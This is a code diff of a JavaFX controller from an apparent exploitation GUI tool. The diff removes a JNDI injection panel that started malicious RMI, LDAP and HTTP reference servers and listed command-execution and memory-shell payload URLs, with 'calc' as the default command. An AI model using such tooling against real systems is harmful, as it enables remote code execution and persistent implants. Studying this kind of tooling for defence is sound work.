@@ -17,11 +17,6 @@ import javafx.scene.control.*;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.Pane;
 import javafx.scene.layout.VBox;
-import jndi.JettyServer;
-import jndi.LDAPRefServer;
-import jndi.RMIRefServer;
-import jndi.ServerStart;
-import utils.Mapper;
 
 import java.io.IOException;
 import java.io.OutputStream;
@@ -80,31 +75,6 @@ public class Controller implements Initializable {
 
     @FXML
     private TextArea GenerateTextArea;
-
-    /**
-     * JNDI
-     */
-
-    @FXML
-    private TextField jndiPort;
-
-    @FXML
-    private TextField jndiIP;
-
-    @FXML
-    private Label labelCommand;
-
-    @FXML
-    private TextField jndiCommand;
-
-    @FXML
-    private CheckBox jndiModeSelect;
-
-    @FXML
-    private TextArea jndiTextArea;
-
-    @FXML
-    private TextArea logTextArea;
 
     /*
     Attack test
@@ -171,56 +141,6 @@ public class Controller implements Initializable {
         GenerateTextArea.clear();
     }
 
-
-    /**
-     * JNDI
-     */
-
-    public void StartJndi(ActionEvent actionEvent) throws Exception {
-        String cmd = jndiCommand.getText().trim();
-        String addr = jndiIP.getText().trim();
-        String portstr = jndiPort.getText().trim();
-        if (jndiPort.getText().isEmpty()) {
-            portstr = "1099";
-        }
-        int port = Integer.parseInt(portstr);
-
-        ServerStart servers = ServerStart.GenerateUrl(cmd, addr, port);
-        Mapper.setUrl();
-        ArrayList<String> ExecCmdUrl = Mapper.getExecCmdUrl();
-        jndiTextArea.appendText("--------------------IP And Port------------------------" + "\n");
-        jndiTextArea.appendText("rmi://" + addr + ":1099\n");
-        jndiTextArea.appendText("ldap://" + addr + ":1389\n");
-        jndiTextArea.appendText("--------------------ExecCmd Path-----------------------" + "\n");
-        for (String value : ExecCmdUrl) {
-            jndiTextArea.appendText(value + "\n");
-        }
-        jndiTextArea.appendText("\n");
-
-        if (jndiModeSelect.isSelected()) {
-            ArrayList<String> MemShellUrl = Mapper.getMemShell();
-            jndiTextArea.appendText("--------------------MemShell Path------------------" + "\n");
-            for (String s : MemShellUrl) {
-                jndiTextArea.appendText(s + "\n");
-            }
-        }
-
-        logTextArea.appendText("------------------------------Server Log-----------------------------" + "\n");
-        logTextArea.appendText(getLocalTime() + " [HTTPSERVER]>> Listening on 0.0.0.0:" + ServerStart.jettyPort + "\n");
-        logTextArea.appendText(getLocalTime() + " [RMISERVER]  >> Listening on 0.0.0.0:" + ServerStart.rmiPort + "\n");
-        logTextArea.appendText(getLocalTime() + " [LDAPSERVER]  >> Listening on 0.0.0.0:" + ServerStart.ldapPort + "\n");
-        ServerStart.getServer(servers);
-    }
-
-    public void CloseJndi(ActionEvent actionEvent) throws Exception {
-        JettyServer.shutdown();
-        RMIRefServer.close();
-        LDAPRefServer.shutdown();
-        jndiTextArea.clear();
-        logTextArea.clear();
-        Mapper.clearUrl();
-        RMIRefServer.setExit(false);
-    }
 
     public GridPane getBaseEXP() throws Exception {
         GridPane root = new GridPane();
@@ -446,10 +366,6 @@ public class Controller implements Initializable {
         };
         System.setOut(new PrintStream(out, true));
 
-        // jndi
-        jndiModeSelect.setSelected(true);
-        jndiCommand.setText("calc");
-
         //exps
         exps.getSelectionModel().selectedItemProperty().addListener(new ChangeListener<String>() {
             @Override
@@ -513,7 +429,6 @@ public class Controller implements Initializable {
                 if (strResult.contains("+")) {
                     expLog.appendText(strResult);
                 } else {
-                    logTextArea.appendText(strResult);
                 }
             }
         });
